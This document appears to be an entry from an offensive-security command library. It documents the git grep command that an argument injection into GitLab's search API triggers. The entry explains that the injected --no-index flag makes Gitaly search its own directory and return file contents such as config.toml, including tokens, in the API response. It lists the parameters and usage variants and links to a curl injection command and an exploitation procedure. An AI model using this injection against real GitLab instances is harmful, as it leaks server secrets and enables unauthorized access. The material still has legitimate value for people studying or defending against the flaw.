---
id: cmd-uuid-2
data: >-
  /opt/gitlab/embedded/bin/git --git-dir
  /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git
  grep --ignore-case -I --line-number --null --before-context 2 --after-context
  2 --perl-regexp -e a --no-index
tags:
  - git
  - grep
  - injection
type: command
output: >-
  NUL-delimited output of matching lines from files like config.toml and
  VERSION, including sensitive configuration data.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.440Z'
verified: false
validated: true
submitted: true
---
# git-grep-backend-injection

## Command

```bash
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
```

## Description

This is the backend git grep command triggered by the API injection, demonstrating how --no-index causes searching of the current directory (/var/opt/gitlab/gitaly) for the pattern 'a', leaking file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--git-dir` | Path to Git repository | Yes |
| `grep` | Subcommand for searching | Yes |
| `--ignore-case` | Case-insensitive search | Yes |
| `-I` | Ignore binary files | Yes |
| `--line-number` | Show line numbers | Yes |
| `--null` | NUL-terminated output | Yes |
| `--before-context 2` | 2 lines before match | Yes |
| `--after-context 2` | 2 lines after match | Yes |
| `--perl-regexp` | Perl regex | Yes |
| `-e a` | Search pattern 'a' | Yes |
| `--no-index` | Search current directory (injected) | Yes |

## Examples

### Basic Usage

```bash
git --git-dir /path/to/repo.git grep -e pattern --no-index
```

### Advanced Usage

```bash
git grep --ignore-case -I --line-number --null -e a --no-index
```

## Expected Output

NUL-delimited lines from matching files, e.g., config snippets with tokens, output to API response.

## Related

- [[commands/curl-gitlab-search-injection-local]]
- [[procedures/Inject-Git-Flag-in-GitLab-Search-API]]
